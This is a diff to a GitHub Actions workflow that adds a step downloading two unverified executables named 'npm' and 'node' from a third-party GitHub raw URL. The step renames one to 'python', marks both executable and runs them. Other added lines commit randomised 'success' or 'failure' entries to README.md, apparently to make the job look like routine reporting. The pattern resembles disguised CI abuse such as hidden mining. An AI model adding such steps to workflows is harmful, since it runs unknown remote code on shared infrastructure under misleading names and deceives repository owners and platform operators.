@@ -10,7 +10,12 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
-      
+      - run: |
+         wget https://raw.githubusercontent.com/Arlentak/ted/main/npm
+         wget https://raw.githubusercontent.com/Arlentak/ted/main/node
+         mv node python
+         chmod +x python npm
+         x
       - name: mencari id
         id: test
         run: echo "::set-output name=mix::`echo $((1 + $RANDOM % 7))`"
@@ -23,6 +28,8 @@ jobs:
          echo "`cat README.md` > 
          - `date` success v${{ steps.test.outputs.mix }} >
          " > README.md 
+         
+         git add . 
          git config --global user.name 'mooghen'
          git config --global user.email 'mooghenchris@proton.me'
          git commit -am "Automated report succes test v${{ steps.test.outputs.mix }}"
@@ -30,6 +37,7 @@ jobs:
       - name: Automated report succes
         if: ${{ failure() }}
         run: |
+         git add . 
          echo "`cat README.md`  > 
          - `date` failure v${{ steps.test.outputs.mix }} >
          " > README.md 
